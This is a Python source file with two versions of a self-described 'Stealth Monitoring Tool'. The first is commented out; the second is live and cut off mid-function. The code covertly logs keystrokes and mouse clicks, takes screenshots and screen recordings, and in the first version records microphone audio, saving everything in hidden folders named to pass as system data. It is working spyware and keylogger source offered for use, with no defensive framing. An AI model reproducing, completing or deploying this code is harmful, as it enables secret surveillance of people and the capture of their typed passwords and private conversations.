# First Code With Audio

# import os
# import sys
# import time
# import threading
# import pyaudio
# import audioop
# import wave
# import subprocess
# import platform
# from datetime import datetime
# import json
# from pathlib import Path

# def install_package(package):
#     """Install a package using pip."""
#     try:
#         subprocess.check_call([sys.executable, "-m", "pip", "install", package])
#         print(f"✅ Successfully installed {package}")
#         return True
#     except subprocess.CalledProcessError:
#         print(f"❌ Failed to install {package}")
#         return False

# def check_and_install_packages():
#     """Check if required packages are installed, install if missing."""
#     required_packages = {
#         'psutil': 'psutil',
#         'pyautogui': 'pyautogui',
#         'opencv-python': 'cv2',
#         'Pillow': 'PIL',
#         'pynput': 'pynput',
#         'pyaudio': 'pyaudio'
#     }
    
#     missing_packages = []
    
#     for package, import_name in required_packages.items():
#         try:
#             __import__(import_name)
#             print(f"✅ {package} is already installed")
#         except ImportError:
#             print(f"❌ {package} not found. Installing...")
#             missing_packages.append(package)
    
#     for package in missing_packages:
#         if not install_package(package):
#             print(f"Failed to install {package}. Please install it manually: pip install {package}")
#             return False
    
#     return True

# # Check and install packages before proceeding
# if not check_and_install_packages():
#     print("Some required packages could not be installed. Please install them manually.")
#     sys.exit(1)

# # Now import the packages
# import psutil
# import pyautogui
# import cv2
# from PIL import Image
# import numpy as np
# from pynput import keyboard
# from pynput.mouse import Listener as MouseListener

# class VoiceRecorder:
#     def __init__(self, hidden_folder):
#         self.hidden_folder = hidden_folder
#         self.audio_folder = os.path.join(hidden_folder, 'audio_recordings')
#         os.makedirs(self.audio_folder, exist_ok=True)
        
#         self.recording = False
#         self.audio_frames = []
#         self.recording_thread = None
#         self.stop_event = threading.Event()
        
#         # Audio configuration
#         self.chunk = 1024
#         self.format = pyaudio.paInt16
#         self.channels = 2
#         self.rate = 44100
#         self.silence_threshold = 500  # Adjust based on environment
#         self.silence_duration = 3     # seconds of silence to stop recording
        
#         self.audio = pyaudio.PyAudio()
    
#     def get_hidden_downloads_folder(self):
#         """Create hidden folder in Downloads directory."""
#         downloads_path = Path.home() / 'Downloads'
#         hidden_folder = downloads_path / '.system_audio_cache'
#         hidden_folder.mkdir(exist_ok=True)
        
#         # Make folder hidden
#         if os.name == 'nt':  # Windows
#             try:
#                 import ctypes
#                 ctypes.windll.kernel32.SetFileAttributesW(str(hidden_folder), 0x02)
#             except:
#                 pass
#         else:  # Linux/Mac - prefix with dot
#             pass  # Already hidden with dot prefix
        
#         return str(hidden_folder)
    
#     def start_recording(self, duration_minutes=5):
#         """Start voice recording."""
#         if self.recording:
#             print("⚠️ Recording is already in progress")
#             return False
        
#         try:
#             self.recording = True
#             self.stop_event.clear()
#             self.audio_frames = []
            
#             self.recording_thread = threading.Thread(target=self._record_audio, args=(duration_minutes,))
#             self.recording_thread.daemon = True
#             self.recording_thread.start()
            
#             print(f"🎤 Voice recording started (duration: {duration_minutes} minutes)")
#             return True
            
#         except Exception as e:
#             print(f"❌ Error starting recording: {e}")
#             self.recording = False
#             return False
    
#     def _record_audio(self, duration_minutes):
#         """Internal method to record audio."""
#         stream = None
#         try:
#             # Open audio stream
#             stream = self.audio.open(
#                 format=self.format,
#                 channels=self.channels,
#                 rate=self.rate,
#                 input=True,
#                 frames_per_buffer=self.chunk
#             )
            
#             silent_chunks = 0
#             max_silent_chunks = (self.silence_duration * self.rate) / self.chunk
#             max_chunks = (duration_minutes * 60 * self.rate) / self.chunk
#             chunk_count = 0
            
#             print("🎤 Listening for audio...")
            
#             while not self.stop_event.is_set() and chunk_count < max_chunks:
#                 data = stream.read(self.chunk, exception_on_overflow=False)
#                 self.audio_frames.append(data)
#                 chunk_count += 1
                
#                 # Detect silence
#                 rms = audioop.rms(data, 2)  # Get RMS volume
#                 if rms < self.silence_threshold:
#                     silent_chunks += 1
#                 else:
#                     silent_chunks = 0
                
#                 # Stop if silence detected for too long
#                 if silent_chunks > max_silent_chunks:
#                     print("🔇 Silence detected, stopping recording")
#                     break
                
#                 # Check every 100 chunks to reduce CPU usage
#                 if chunk_count % 100 == 0:
#                     print(f"⏺️ Recording... {chunk_count * self.chunk / self.rate:.1f}s")
            
#             # Save recording
#             self._save_recording()
            
#         except Exception as e:
#             print(f"❌ Error during recording: {e}")
#         finally:
#             if stream:
#                 stream.stop_stream()
#                 stream.close()
#             self.recording = False
    
#     def _save_recording(self):
#         """Save recorded audio to file."""
#         if not self.audio_frames:
#             print("⚠️ No audio data to save")
#             return
        
#         try:
#             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
#             # Save to both locations
#             filename = f"audio_{timestamp}.wav"
            
#             # Primary location (hidden downloads folder)
#             downloads_hidden_folder = self.get_hidden_downloads_folder()
#             primary_path = os.path.join(downloads_hidden_folder, filename)
            
#             # Secondary location (main hidden folder)
#             secondary_path = os.path.join(self.audio_folder, filename)
            
#             # Save to primary location
#             with wave.open(primary_path, 'wb') as wf:
#                 wf.setnchannels(self.channels)
#                 wf.setsampwidth(self.audio.get_sample_size(self.format))
#                 wf.setframerate(self.rate)
#                 wf.writeframes(b''.join(self.audio_frames))
            
#             print(f"💾 Audio saved to hidden downloads: {primary_path}")
            
#             # Also save to secondary location
#             with wave.open(secondary_path, 'wb') as wf:
#                 wf.setnchannels(self.channels)
#                 wf.setsampwidth(self.audio.get_sample_size(self.format))
#                 wf.setframerate(self.rate)
#                 wf.writeframes(b''.join(self.audio_frames))
            
#             print(f"💾 Audio saved to backup location: {secondary_path}")
            
#             # Log activity
#             self._log_audio_activity(filename, len(self.audio_frames))
            
#         except Exception as e:
#             print(f"❌ Error saving audio: {e}")
    
#     def _log_audio_activity(self, filename, frame_count):
#         """Log audio recording activity."""
#         duration = (frame_count * self.chunk) / self.rate
#         log_entry = f"Audio recording saved: {filename} (duration: {duration:.1f}s)"
        
#         log_file = os.path.join(self.hidden_folder, 'logs', 'audio_activity.log')
#         os.makedirs(os.path.dirname(log_file), exist_ok=True)
        
#         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
#         with open(log_file, 'a') as f:
#             f.write(f"[{timestamp}] {log_entry}\n")
    
#     def stop_recording(self):
#         """Stop voice recording."""
#         if not self.recording:
#             print("⚠️ No recording in progress")
#             return False
        
#         self.stop_event.set()
#         self.recording = False
        
#         if self.recording_thread and self.recording_thread.is_alive():
#             self.recording_thread.join(timeout=2)
        
#         print("🛑 Voice recording stopped")
#         return True
    
#     def record_with_voice_activation(self, max_duration_minutes=10):
#         """Record audio only when voice is detected."""
#         def voice_activated_record():
#             stream = None
#             try:
#                 stream = self.audio.open(
#                     format=self.format,
#                     channels=self.channels,
#                     rate=self.rate,
#                     input=True,
#                     frames_per_buffer=self.chunk
#                 )
                
#                 print("🎤 Voice activation mode - waiting for speech...")
                
#                 # Wait for voice activation
#                 while not self.stop_event.is_set():
#                     data = stream.read(self.chunk, exception_on_overflow=False)
#                     rms = audioop.rms(data, 2)
                    
#                     if rms > self.silence_threshold:
#                         print("🎤 Voice detected! Starting recording...")
#                         self.audio_frames = [data]  # Start with current chunk
#                         break
#                     time.sleep(0.1)  # Small delay to reduce CPU usage
                
#                 # Continue recording while voice is detected
#                 silent_chunks = 0
#                 max_silent_chunks = (self.silence_duration * self.rate) / self.chunk
#                 max_chunks = (max_duration_minutes * 60 * self.rate) / self.chunk
#                 chunk_count = 1
                
#                 while (not self.stop_event.is_set() and 
#                        chunk_count < max_chunks and 
#                        silent_chunks < max_silent_chunks):
                    
#                     data = stream.read(self.chunk, exception_on_overflow=False)
#                     self.audio_frames.append(data)
#                     chunk_count += 1
                    
#                     rms = audioop.rms(data, 2)
#                     if rms < self.silence_threshold:
#                         silent_chunks += 1
#                     else:
#                         silent_chunks = 0
                    
#                     # Small delay to control CPU usage
#                     time.sleep(0.01)
                
#                 self._save_recording()
                
#             except Exception as e:
#                 print(f"❌ Error in voice-activated recording: {e}")
#             finally:
#                 if stream:
#                     stream.stop_stream()
#                     stream.close()
#                 self.recording = False
        
#         if self.recording:
#             print("⚠️ Recording is already in progress")
#             return False
        
#         self.recording = True
#         self.stop_event.clear()
        
#         self.recording_thread = threading.Thread(target=voice_activated_record)
#         self.recording_thread.daemon = True
#         self.recording_thread.start()
        
#         return True
    
#     def get_audio_devices(self):
#         """List available audio input devices."""
#         print("\n🎧 Available Audio Input Devices:")
#         print("-" * 40)
        
#         for i in range(self.audio.get_device_count()):
#             device_info = self.audio.get_device_info_by_index(i)
#             if device_info['maxInputChannels'] > 0:
#                 print(f"Device {i}: {device_info['name']}")
#                 print(f"  Channels: {device_info['maxInputChannels']}")
#                 print(f"  Sample Rate: {device_info['defaultSampleRate']}")
#                 print()
    
#     def cleanup_old_audio_files(self, max_files=50, max_age_days=7):
#         """Clean up old audio files."""
#         downloads_hidden_folder = self.get_hidden_downloads_folder()
        
#         for folder in [self.audio_folder, downloads_hidden_folder]:
#             if not os.path.exists(folder):
#                 continue
            
#             audio_files = []
#             for file in os.listdir(folder):
#                 if file.endswith('.wav'):
#                     file_path = os.path.join(folder, file)
#                     stat = os.stat(file_path)
#                     audio_files.append((stat.st_mtime, file_path))
            
#             # Sort by modification time (oldest first)
#             audio_files.sort()
            
#             # Remove files older than max_age_days
#             current_time = time.time()
#             for mtime, file_path in audio_files:
#                 if (current_time - mtime) > (max_age_days * 24 * 60 * 60):
#                     try:
#                         os.remove(file_path)
#                         print(f"🧹 Cleaned up old audio file: {os.path.basename(file_path)}")
#                     except:
#                         pass
            
#             # Remove excess files if too many
#             if len(audio_files) > max_files:
#                 files_to_remove = len(audio_files) - max_files
#                 for i in range(files_to_remove):
#                     try:
#                         os.remove(audio_files[i][1])
#                         print(f"🧹 Cleaned up excess audio file: {os.path.basename(audio_files[i][1])}")
#                     except:
#                         pass
    
#     def __del__(self):
#         """Cleanup when object is destroyed."""
#         if hasattr(self, 'audio'):
#             self.audio.terminate()

# class StealthMonitor:
#     def __init__(self):
#         self.hidden_folder = self.create_hidden_folder()
#         self.is_monitoring = False
#         self.screenshot_interval = 30  # seconds
#         self.recording_duration = 60  # seconds per recording segment
#         self.screenshot_count = 0
#         self.recording_count = 0
#         self.key_log = []
#         self.mouse_log = []
        
#         # Initialize voice recorder
#         self.voice_recorder = VoiceRecorder(self.hidden_folder)
        
#         # Configuration
#         self.config = {
#             'screenshot_quality': 85,
#             'recording_fps': 10,
#             'max_file_size_mb': 100,
#             'auto_start': False,
#             'stealth_mode': True,
#             'voice_record_duration': 5,
#             'voice_activation_threshold': 500
#         }
        
#         self.load_config()
    
#     def create_hidden_folder(self):
#         """Create a hidden folder for storing captures."""
#         system = platform.system()
        
#         if system == "Windows":
#             hidden_folder = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'SystemData')
#         elif system == "Darwin":  # macOS
#             hidden_folder = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'SystemHelper')
#         else:  # Linux/Unix
#             hidden_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
        
#         # Create hidden folder
#         os.makedirs(hidden_folder, exist_ok=True)
        
#         # Make folder hidden (Windows)
#         if system == "Windows":
#             try:
#                 subprocess.call(['attrib', '+H', hidden_folder])
#             except:
#                 pass
        
#         # Create subfolders
#         subfolders = ['screenshots', 'recordings', 'logs', 'data', 'audio_recordings']
#         for folder in subfolders:
#             os.makedirs(os.path.join(hidden_folder, folder), exist_ok=True)
        
#         return hidden_folder
    
#     def load_config(self):
#         """Load configuration from file."""
#         config_file = os.path.join(self.hidden_folder, 'data', 'config.json')
#         if os.path.exists(config_file):
#             try:
#                 with open(config_file, 'r') as f:
#                     loaded_config = json.load(f)
#                     self.config.update(loaded_config)
#             except:
#                 pass
    
#     def save_config(self):
#         """Save configuration to file."""
#         config_file = os.path.join(self.hidden_folder, 'data', 'config.json')
#         with open(config_file, 'w') as f:
#             json.dump(self.config, f, indent=2)
    
#     def check_internet_connection(self):
#         """Check if internet connection is available."""
#         try:
#             # Try to connect to Google DNS
#             import socket
#             socket.create_connection(("8.8.8.8", 53), timeout=5)
#             return True
#         except OSError:
#             pass
        
#         try:
#             # Try HTTP request to google.com
#             import requests
#             response = requests.get("http://www.google.com", timeout=10)
#             return response.status_code == 200
#         except:
#             return False
    
#     def get_system_info(self):
#         """Get system information."""
#         info = {
#             'timestamp': datetime.now().isoformat(),
#             'platform': platform.platform(),
#             'processor': platform.processor(),
#             'memory_total': psutil.virtual_memory().total,
#             'memory_available': psutil.virtual_memory().available,
#             'disk_usage': psutil.disk_usage('/')._asdict(),
#             'network_interfaces': []
#         }
        
#         # Get network info
#         for interface, addrs in psutil.net_if_addrs().items():
#             interface_info = {
#                 'interface': interface,
#                 'addresses': []
#             }
#             for addr in addrs:
#                 interface_info['addresses'].append({
#                     'family': str(addr.family),
#                     'address': addr.address,
#                     'netmask': addr.netmask
#                 })
#             info['network_interfaces'].append(interface_info)
        
#         return info
    
#     def take_screenshot(self):
#         """Take a screenshot and save it."""
#         try:
#             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
#             filename = f"screenshot_{timestamp}_{self.screenshot_count:04d}.jpg"
#             filepath = os.path.join(self.hidden_folder, 'screenshots', filename)
            
#             # Take screenshot
#             screenshot = pyautogui.screenshot()
            
#             # Compress and save
#             screenshot.save(filepath, quality=self.config['screenshot_quality'])
            
#             self.screenshot_count += 1
#             print(f"📸 Screenshot saved: {filename}")
            
#             # Log screenshot activity
#             self.log_activity(f"Screenshot taken: {filename}")
            
#             return True
#         except Exception as e:
#             print(f"❌ Error taking screenshot: {e}")
#             return False
    
#     def record_screen(self):
#         """Record screen for specified duration."""
#         try:
#             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
#             filename = f"recording_{timestamp}_{self.recording_count:04d}.avi"
#             filepath = os.path.join(self.hidden_folder, 'recordings', filename)
            
#             # Get screen size
#             screen_size = pyautogui.size()
            
#             # Define codec and create VideoWriter object
#             fourcc = cv2.VideoWriter_fourcc(*'XVID')
#             out = cv2.VideoWriter(filepath, fourcc, self.config['recording_fps'], screen_size)
            
#             start_time = time.time()
            
#             print(f"🎥 Starting recording: {filename}")
            
#             while (time.time() - start_time) < self.recording_duration and self.is_monitoring:
#                 # Capture screen
#                 img = pyautogui.screenshot()
#                 frame = np.array(img)
#                 frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                
#                 # Write frame
#                 out.write(frame)
                
#                 # Small delay to control frame rate
#                 time.sleep(1/self.config['recording_fps'])
            
#             # Release everything
#             out.release()
            
#             self.recording_count += 1
#             print(f"✅ Recording saved: {filename}")
            
#             # Log recording activity
#             self.log_activity(f"Recording saved: {filename}")
            
#             return True
#         except Exception as e:
#             print(f"❌ Error recording screen: {e}")
#             return False
    
#     def on_key_press(self, key):
#         """Handle key press events."""
#         try:
#             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
#             key_str = str(key).replace("'", "")
            
#             # Special keys handling
#             if hasattr(key, 'name'):
#                 key_str = f"[{key.name.upper()}]"
            
#             self.key_log.append({
#                 'timestamp': timestamp,
#                 'key': key_str,
#                 'action': 'press'
#             })
            
#             # Save keylog periodically
#             if len(self.key_log) >= 10:
#                 self.save_keylog()
        
#         except Exception as e:
#             print(f"Error in key logger: {e}")
    
#     def on_click(self, x, y, button, pressed):
#         """Handle mouse click events."""
#         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
#         self.mouse_log.append({
#             'timestamp': timestamp,
#             'x': x,
#             'y': y,
#             'button': str(button),
#             'action': 'click' if pressed else 'release'
#         })
        
#         # Save mouselog periodically
#         if len(self.mouse_log) >= 20:
#             self.save_mouselog()
    
#     def save_keylog(self):
#         """Save keylog to file."""
#         if not self.key_log:
#             return
        
#         log_file = os.path.join(self.hidden_folder, 'logs', 'keylog.json')
        
#         try:
#             # Read existing log
#             existing_log = []
#             if os.path.exists(log_file):
#                 with open(log_file, 'r') as f:
#                     existing_log = json.load(f)
            
#             # Append new entries
#             existing_log.extend(self.key_log)
#             self.key_log = []
            
#             # Save back to file
#             with open(log_file, 'w') as f:
#                 json.dump(existing_log, f, indent=2)
                
#         except Exception as e:
#             print(f"Error saving keylog: {e}")
    
#     def save_mouselog(self):
#         """Save mouselog to file."""
#         if not self.mouse_log:
#             return
        
#         log_file = os.path.join(self.hidden_folder, 'logs', 'mouselog.json')
        
#         try:
#             # Read existing log
#             existing_log = []
#             if os.path.exists(log_file):
#                 with open(log_file, 'r') as f:
#                     existing_log = json.load(f)
            
#             # Append new entries
#             existing_log.extend(self.mouse_log)
#             self.mouse_log = []
            
#             # Save back to file
#             with open(log_file, 'w') as f:
#                 json.dump(existing_log, f, indent=2)
                
#         except Exception as e:
#             print(f"Error saving mouselog: {e}")
    
#     def log_activity(self, message):
#         """Log general activity."""
#         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
#         log_entry = f"[{timestamp}] {message}\n"
        
#         log_file = os.path.join(self.hidden_folder, 'logs', 'activity.log')
        
#         with open(log_file, 'a') as f:
#             f.write(log_entry)
    
#     def cleanup_old_files(self):
#         """Clean up old files to avoid disk space issues."""
#         max_size = self.config['max_file_size_mb'] * 1024 * 1024  # Convert to bytes
        
#         for folder in ['screenshots', 'recordings', 'audio_recordings']:
#             folder_path = os.path.join(self.hidden_folder, folder)
            
#             if not os.path.exists(folder_path):
#                 continue
            
#             # Get total size
#             total_size = 0
#             for file in os.listdir(folder_path):
#                 file_path = os.path.join(folder_path, file)
#                 total_size += os.path.getsize(file_path)
            
#             # If over limit, delete oldest files
#             if total_size > max_size:
#                 files = []
#                 for file in os.listdir(folder_path):
#                     file_path = os.path.join(folder_path, file)
#                     files.append((os.path.getctime(file_path), file_path))
                
#                 # Sort by creation time (oldest first)
#                 files.sort()
                
#                 # Delete until under limit
#                 for creation_time, file_path in files:
#                     if total_size <= max_size:
#                         break
                    
#                     file_size = os.path.getsize(file_path)
#                     os.remove(file_path)
#                     total_size -= file_size
                    
#                     print(f"🧹 Cleaned up: {os.path.basename(file_path)}")
    
#     def screenshot_worker(self):
#         """Worker thread for taking screenshots."""
#         while self.is_monitoring:
#             self.take_screenshot()
            
#             # Wait for interval
#             for _ in range(self.screenshot_interval):
#                 if not self.is_monitoring:
#                     break
#                 time.sleep(1)
    
#     def recording_worker(self):
#         """Worker thread for recording."""
#         while self.is_monitoring:
#             self.record_screen()
            
#             # Small delay between recordings
#             for _ in range(5):  # 5 second break between recordings
#                 if not self.is_monitoring:
#                     break
#                 time.sleep(1)
    
#     def monitoring_worker(self):
#         """Main monitoring worker."""
#         # Start keyboard listener
#         keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
#         keyboard_listener.start()
        
#         # Start mouse listener
#         mouse_listener = MouseListener(on_click=self.on_click)
#         mouse_listener.start()
        
#         # Start screenshot thread
#         screenshot_thread = threading.Thread(target=self.screenshot_worker)
#         screenshot_thread.daemon = True
#         screenshot_thread.start()
        
#         # Start recording thread
#         recording_thread = threading.Thread(target=self.recording_worker)
#         recording_thread.daemon = True
#         recording_thread.start()
        
#         print("🚀 Monitoring started...")
#         print(f"📁 Data stored in: {self.hidden_folder}")
#         print("Press Ctrl+C to stop monitoring")
        
#         try:
#             while self.is_monitoring:
#                 # Check internet connection every minute
#                 internet_status = "✅ Online" if self.check_internet_connection() else "❌ Offline"
                
#                 # System status update every 5 minutes
#                 if int(time.time()) % 300 == 0:
#                     system_info = self.get_system_info()
#                     info_file = os.path.join(self.hidden_folder, 'data', 'system_info.json')
#                     with open(info_file, 'w') as f:
#                         json.dump(system_info, f, indent=2)
                    
#                     # Cleanup old files
#                     self.cleanup_old_files()
                    
#                     # Cleanup old audio files
#                     self.voice_recorder.cleanup_old_audio_files()
                
#                 time.sleep(1)
                
#         except KeyboardInterrupt:
#             self.stop_monitoring()
        
#         finally:
#             # Stop listeners
#             keyboard_listener.stop()
#             mouse_listener.stop()
            
#             # Save remaining logs
#             self.save_keylog()
#             self.save_mouselog()
    
#     def start_monitoring(self):
#         """Start the monitoring process."""
#         if self.is_monitoring:
#             print("⚠️ Monitoring is already running")
#             return
        
#         self.is_monitoring = True
        
#         # Save initial system info
#         system_info = self.get_system_info()
#         info_file = os.path.join(self.hidden_folder, 'data', 'system_info.json')
#         with open(info_file, 'w') as f:
#             json.dump(system_info, f, indent=2)
        
#         # Save config
#         self.save_config()
        
#         # Log startup
#         self.log_activity("Monitoring started")
        
#         # Start monitoring
#         self.monitoring_worker()
    
#     def stop_monitoring(self):
#         """Stop the monitoring process."""
#         if not self.is_monitoring:
#             print("⚠️ Monitoring is not running")
#             return
        
#         self.is_monitoring = False
#         self.log_activity("Monitoring stopped")
#         print("🛑 Monitoring stopped")
    
#     def show_status(self):
#         """Show current monitoring status."""
#         status = "ACTIVE" if self.is_monitoring else "INACTIVE"
#         print(f"\n📊 Monitoring Status: {status}")
#         print(f"📁 Storage Location: {self.hidden_folder}")
        
#         # Show file counts
#         screenshots_path = os.path.join(self.hidden_folder, 'screenshots')
#         recordings_path = os.path.join(self.hidden_folder, 'recordings')
#         audio_path = os.path.join(self.hidden_folder, 'audio_recordings')
        
#         screenshot_count = len([f for f in os.listdir(screenshots_path) if f.endswith('.jpg')]) if os.path.exists(screenshots_path) else 0
#         recording_count = len([f for f in os.listdir(recordings_path) if f.endswith('.avi')]) if os.path.exists(recordings_path) else 0
#         audio_count = len([f for f in os.listdir(audio_path) if f.endswith('.wav')]) if os.path.exists(audio_path) else 0
        
#         print(f"📸 Screenshots: {screenshot_count}")
#         print(f"🎥 Recordings: {recording_count}")
#         print(f"🎤 Audio Recordings: {audio_count}")
#         print(f"🌐 Internet: {'✅ Online' if self.check_internet_connection() else '❌ Offline'}")
#         print(f"🎤 Voice Recording: {'✅ Active' if self.voice_recorder.recording else '❌ Inactive'}")

#     # Voice recording methods
#     def start_voice_recording(self, duration_minutes=5):
#         """Start voice recording."""
#         return self.voice_recorder.start_recording(duration_minutes)

#     def stop_voice_recording(self):
#         """Stop voice recording."""
#         return self.voice_recorder.stop_recording()

#     def start_voice_activated_recording(self, max_duration=10):
#         """Start voice-activated recording."""
#         return self.voice_recorder.record_with_voice_activation(max_duration)

#     def list_audio_devices(self):
#         """List available audio input devices."""
#         self.voice_recorder.get_audio_devices()

#     def cleanup_audio_files(self):
#         """Clean up old audio files."""
#         self.voice_recorder.cleanup_old_audio_files()

# def main():
#     """Main function."""
#     monitor = StealthMonitor()
    
#     print("🕵️‍♂️ Stealth Monitoring Tool")
#     print("=" * 50)
    
#     while True:
#         print("\nOptions:")
#         print("1. Start Monitoring")
#         print("2. Stop Monitoring")
#         print("3. Show Status")
#         print("4. Take Single Screenshot")
#         print("5. Configuration")
#         print("6. Voice Recording Options")
#         print("7. Exit")
        
#         choice = input("\nEnter your choice (1-7): ").strip()
        
#         if choice == '1':
#             monitor.start_monitoring()
#         elif choice == '2':
#             monitor.stop_monitoring()
#         elif choice == '3':
#             monitor.show_status()
#         elif choice == '4':
#             monitor.take_screenshot()
#         elif choice == '5':
#             print("\nConfiguration:")
#             for key, value in monitor.config.items():
#                 print(f"{key}: {value}")
            
#             change = input("\nChange configuration? (y/n): ").lower()
#             if change == 'y':
#                 key = input("Enter setting name: ").strip()
#                 if key in monitor.config:
#                     new_value = input(f"Enter new value for {key} (current: {monitor.config[key]}): ").strip()
#                     # Try to convert to appropriate type
#                     if isinstance(monitor.config[key], bool):
#                         monitor.config[key] = new_value.lower() in ['true', 'yes', '1', 'y']
#                     elif isinstance(monitor.config[key], int):
#                         try:
#                             monitor.config[key] = int(new_value)
#                         except:
#                             print("Invalid integer value")
#                     elif isinstance(monitor.config[key], float):
#                         try:
#                             monitor.config[key] = float(new_value)
#                         except:
#                             print("Invalid float value")
#                     else:
#                         monitor.config[key] = new_value
                    
#                     monitor.save_config()
#                     print("✅ Configuration updated")
#                 else:
#                     print("❌ Invalid setting name")
#         elif choice == '6':  # Voice Recording
#             print("\n🎤 Voice Recording Options:")
#             print("1. Start continuous recording (5 minutes)")
#             print("2. Start voice-activated recording")
#             print("3. Stop current recording")
#             print("4. List audio devices")
#             print("5. Cleanup old audio files")
            
#             audio_choice = input("Enter choice (1-5): ").strip()
            
#             if audio_choice == '1':
#                 duration = input("Enter duration in minutes (default: 5): ").strip()
#                 try:
#                     duration = int(duration) if duration else 5
#                     monitor.start_voice_recording(duration)
#                 except ValueError:
#                     print("❌ Invalid duration")
            
#             elif audio_choice == '2':
#                 duration = input("Enter max duration in minutes (default: 10): ").strip()
#                 try:
#                     duration = int(duration) if duration else 10
#                     monitor.start_voice_activated_recording(duration)
#                 except ValueError:
#                     print("❌ Invalid duration")
            
#             elif audio_choice == '3':
#                 monitor.stop_voice_recording()
            
#             elif audio_choice == '4':
#                 monitor.list_audio_devices()
            
#             elif audio_choice == '5':
#                 monitor.cleanup_audio_files()
            
#             else:
#                 print("❌ Invalid choice")
#         elif choice == '7':
#             if monitor.is_monitoring:
#                 monitor.stop_monitoring()
#             print("👋 Exiting...")
#             break
#         else:
#             print("❌ Invalid choice")

# if __name__ == "__main__":
#     # Import required modules that were installed
#     import socket
#     import psutil
#     import pyautogui
#     import cv2
#     from PIL import Image
#     import numpy as np
#     from pynput import keyboard
#     from pynput.mouse import Listener as MouseListener
    
#     main()



# Second Code

import os
import sys
import time
import threading
import subprocess
import platform
from datetime import datetime
import json

def install_package(package):
    """Install a package using pip."""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        print(f"✅ Successfully installed {package}")
        return True
    except subprocess.CalledProcessError:
        print(f"❌ Failed to install {package}")
        return False

def check_and_install_packages():
    """Check if required packages are installed, install if missing."""
    required_packages = {
        'psutil': 'psutil',
        'pyautogui': 'pyautogui',
        'opencv-python': 'cv2',
        'Pillow': 'PIL',
        'pynput': 'pynput'
    }
    
    missing_packages = []
    
    for package, import_name in required_packages.items():
        try:
            __import__(import_name)
            print(f"✅ {package} is already installed")
        except ImportError:
            print(f"❌ {package} not found. Installing...")
            missing_packages.append(package)
    
    for package in missing_packages:
        if not install_package(package):
            print(f"Failed to install {package}. Please install it manually: pip install {package}")
            return False
    
    return True

# Check and install packages before proceeding
if not check_and_install_packages():
    print("Some required packages could not be installed. Please install them manually.")
    sys.exit(1)

# Now import the packages
import psutil
import pyautogui
import cv2
from PIL import Image
import numpy as np
from pynput import keyboard
from pynput.mouse import Listener as MouseListener

class StealthMonitor:
    def __init__(self):
        self.hidden_folder = self.create_hidden_folder()
        self.is_monitoring = False
        self.screenshot_interval = 30  # seconds
        self.recording_duration = 60  # seconds per recording segment
        self.screenshot_count = 0
        self.recording_count = 0
        self.key_log = []
        self.mouse_log = []
        
        # Configuration
        self.config = {
            'screenshot_quality': 85,
            'recording_fps': 10,
            'max_file_size_mb': 100,
            'auto_start': False,
            'stealth_mode': True
        }
        
        self.load_config()
    
    def create_hidden_folder(self):
        """Create a hidden folder for storing captures."""
        system = platform.system()
        
        if system == "Windows":
            hidden_folder = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'SystemData')
        elif system == "Darwin":  # macOS
            hidden_folder = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'SystemHelper')
        else:  # Linux/Unix
            hidden_folder = os.path.join(os.path.expanduser('~'), '.system_monitor')
        
        # Create hidden folder
        os.makedirs(hidden_folder, exist_ok=True)
        
        # Make folder hidden (Windows)
        if system == "Windows":
            try:
                subprocess.call(['attrib', '+H', hidden_folder])
            except:
                pass
        
        # Create subfolders
        subfolders = ['screenshots', 'recordings', 'logs', 'data']
        for folder in subfolders:
            os.makedirs(os.path.join(hidden_folder, folder), exist_ok=True)
        
        return hidden_folder
    
    def load_config(self):
        """Load configuration from file."""
        config_file = os.path.join(self.hidden_folder, 'data', 'config.json')
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    loaded_config = json.load(f)
                    self.config.update(loaded_config)
            except:
                pass
    
    def save_config(self):
        """Save configuration to file."""
        config_file = os.path.join(self.hidden_folder, 'data', 'config.json')
        with open(config_file, 'w') as f:
            json.dump(self.config, f, indent=2)
    
    def check_internet_connection(self):
        """Check if internet connection is available."""
        try:
            # Try to connect to Google DNS
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            return True
        except OSError:
            pass
        
        try:
            # Try HTTP request to google.com
            import requests
            response = requests.get("http://www.google.com", timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def get_system_info(self):
        """Get system information."""
        info = {
            'timestamp': datetime.now().isoformat(),
            'platform': platform.platform(),
            'processor': platform.processor(),
            'memory_total': psutil.virtual_memory().total,
            'memory_available': psutil.virtual_memory().available,
            'disk_usage': psutil.disk_usage('/')._asdict(),
            'network_interfaces': []
        }
        
        # Get network info
        for interface, addrs in psutil.net_if_addrs().items():
            interface_info = {
                'interface': interface,
                'addresses': []
            }
            for addr in addrs:
                interface_info['addresses'].append({
                    'family': str(addr.family),
                    'address': addr.address,
                    'netmask': addr.netmask
                })
            info['network_interfaces'].append(interface_info)
        
        return info
    
    def take_screenshot(self):
        """Take a screenshot and save it."""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}_{self.screenshot_count:04d}.jpg"
            filepath = os.path.join(self.hidden_folder, 'screenshots', filename)
            
            # Take screenshot
            screenshot = pyautogui.screenshot()
            
            # Compress and save
            screenshot.save(filepath, quality=self.config['screenshot_quality'])
            
            self.screenshot_count += 1
            print(f"📸 Screenshot saved: {filename}")
            
            # Log screenshot activity
            self.log_activity(f"Screenshot taken: {filename}")
            
            return True
        except Exception as e:
            print(f"❌ Error taking screenshot: {e}")
            return False
    
    def record_screen(self):
        """Record screen for specified duration."""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"recording_{timestamp}_{self.recording_count:04d}.avi"
            filepath = os.path.join(self.hidden_folder, 'recordings', filename)
            
            # Get screen size
